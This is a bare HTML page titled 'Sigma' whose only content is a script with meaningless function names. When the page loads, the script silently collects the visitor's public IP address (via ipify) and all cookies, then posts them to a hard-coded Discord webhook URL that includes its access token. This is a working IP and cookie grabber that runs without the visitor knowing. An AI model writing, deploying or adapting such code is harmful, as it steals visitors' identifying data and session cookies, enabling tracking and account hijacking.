<!DOCTYPE html>
<html>
<head>
    <title>Sigma</title>
</head>
<body>
    <script>
        (function() {
            async function g1() {
                try {
                    const a = await fetch('https://api.ipify.org?format=json');
                    const b = await a.json();
                    return b.ip;
                } catch (c) {
                    console.error('Error fetching IP:', c);
                    return null;
                }
            }

            function g2() {
                return document.cookie;
            }

            async function g3(d, e) {
                const f = 'https://discord.com/api/webhooks/1255265339168653332/SPafbuMfrJhli7L-WzcOd7WecHbqUJneZb-njOhECgAYreOqdo9i9pKAVGzMwpel2pxN';
                const g = {
                    content: `User IP: ${d}\nCookies: ${e}`
                };

                try {
                    const h = await fetch(f, {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json'
                        },
                        body: JSON.stringify(g)
                    });

                    if (h.ok) {
                        console.log('Data sent to Discord successfully');
                    } else {
                        console.error('Error sending data to Discord:', h.statusText);
                    }
                } catch (i) {
                    console.error('Error sending data to Discord:', i);
                }
            }

            async function g4() {
                const j = await g1();
                const k = g2();
                if (j) {
                    await g3(j, k);
                } else {
                    console.error('Could not retrieve user IP');
                }
            }

            window.onload = g4;
        })();
    </script>
</body>
</html>
